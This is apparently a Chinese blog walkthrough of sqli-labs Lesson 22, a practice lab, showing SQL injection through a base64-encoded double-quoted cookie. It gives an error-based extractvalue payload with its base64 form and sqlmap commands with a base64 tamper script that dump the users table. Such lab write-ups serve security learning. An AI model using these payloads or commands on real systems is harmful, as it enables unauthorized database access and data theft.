---
title: sqli-labs-lession 22 base64编码加密的双引号Cookie注入
date: 2018-10-03 11:33:38
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs-lession 22 base64编码加密的双引号Cookie注入

---

## 登录界面

![001](/img/sql/Lesson-22/001.png)

## 注入

看标题名字就知道只是变化了个引号,直接测试。

`admin"`的base64加密为`YWRtaW4i`

![002](/img/sql/Lesson-22/002.png)

其他都一样了,直接上payload

```
admin" and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#
#对应加密
YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUobnVsbCxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lID0gJ3VzZXJzJyksMHg3ZSkpIw==
```

![003](/img/sql/Lesson-22/003.png)

## SQLMAP

也是一样的过程,先在firefox浏览器设置代理,在用Burpsuite抓到刷新界面的包,在Cookie处加个*,保存到文件。

![004](/img/sql/Lesson-22/004.png)

```
--dbms 指定后端数据库
--technique E 指定注入类型为报错注入
--threads 10 指定并发线程数
--level 2 指定检测等级,等级2包括Cookie
--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)
--flush-session 刷新session
--fresh-queries 建立新的查询
```

`python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries`

![005](/img/sql/Lesson-22/005.png)

![006](/img/sql/Lesson-22/006.png)

`python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump`

![007](/img/sql/Lesson-22/007.png)

